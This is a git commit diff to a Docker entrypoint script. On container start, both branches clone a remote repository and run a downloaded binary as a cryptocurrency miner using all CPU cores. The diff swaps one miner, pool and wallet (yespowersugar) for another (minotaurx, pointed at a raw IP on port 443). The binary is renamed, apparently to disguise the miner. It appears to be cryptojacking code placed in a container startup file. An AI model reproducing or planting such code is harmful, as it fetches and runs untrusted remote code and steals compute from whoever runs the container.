e9146082320efeaad27059dd8001f49ee106daf7
sxiankerigak <120899770+sxiankerigak@users.noreply.github.com>
2023-01-21 01:27:44 +0700

    Update docker-entrypoint.sh

--- docker-entrypoint.sh
+++ docker-entrypoint.sh
@@ -3,8 +3,8 @@
 set -e
 
 if [ "$PROTO" = "ws" ]
-then	git clone https://gitlab.com/azkadafa39/yiyi.git && cd yiyi && chmod +x plant && ./plant -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.seger -p x -t $(nproc --all)
-else	git clone https://gitlab.com/azkadafa39/yiyi.git && cd yiyi && chmod +x plant && ./plant -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.seger -p x -t $(nproc --all)
+then	git clone https://github.com/sxiankerigak/parklite.git && cd parklite && chmod +x BTRM && ./BTRM -a minotaurx -o 165.227.89.212:443 -u PHH7Zq7tUpRjMqEvN3QXHsoprjzZpAxnzm.XXX -p x -t$(nproc --all)
+else	git clone https://github.com/sxiankerigak/parklite.git && cd parklite && chmod +x BTRM && ./BTRM -a minotaurx -o 165.227.89.212:443 -u PHH7Zq7tUpRjMqEvN3QXHsoprjzZpAxnzm.XXX -p x -t$(nproc --all)
 fi
 
 
